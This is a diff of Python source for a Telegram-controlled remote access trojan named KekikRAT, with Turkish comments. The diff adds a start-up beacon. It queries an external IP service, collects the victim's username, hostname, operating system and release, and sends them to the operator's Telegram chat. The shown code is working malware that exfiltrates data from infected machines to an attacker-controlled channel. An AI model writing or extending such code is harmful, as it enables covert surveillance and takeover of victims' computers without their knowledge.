@@ -23,6 +23,24 @@ Chat_ID = "XXXX"                                       # Chat ID
 KekikRAT = telebot.TeleBot(Bot_Token)  # telebot'a Tokenimizi bağladık
 # / Telegram Bağlantısı ################################################
 
+# / Bağlantı Geldi #################################################
+r = requests.get('http://ip.42.pl/raw') # Harici IP'yi bulmak için bir GET isteği yolluyoruz
+
+KullaniciAdi = os.getlogin()    # Kullanıcı Adı Değişkeni tanımlıyoruz
+BilgisayarAdi = platform.node() # Bilgisayar Adı Değişkeni
+IP = r.text                     # IP Değişkeni tanımlıyoruz
+Sistem = platform.system()      # İşletim Sistemi Bilgisi
+Bellenim = platform.release()   # Bellenim Sürümü Bilgisi
+islemci = platform.processor()  # İşlemci Özellikleri
+
+KekikRAT.send_chat_action(Chat_ID, 'typing')
+KekikRAT.send_message(Chat_ID,
+                   "⚠️ Bağlantı Geldi ⚠️\n\n" +
+                   KullaniciAdi + '@' + BilgisayarAdi +
+                   "\n\t" + IP +
+                   "\n\nOS : " + Sistem + ' | ' + Bellenim) # Mesaj gönder
+# / Bağlantı Geldi #################################################
+
 # / Basla Komutu ########################################################################
 @KekikRAT.message_handler(commands=['basla', 'Basla']) # Basla Komutunu bekliyorum
 def baslangic(command): # Komut yürütülürse
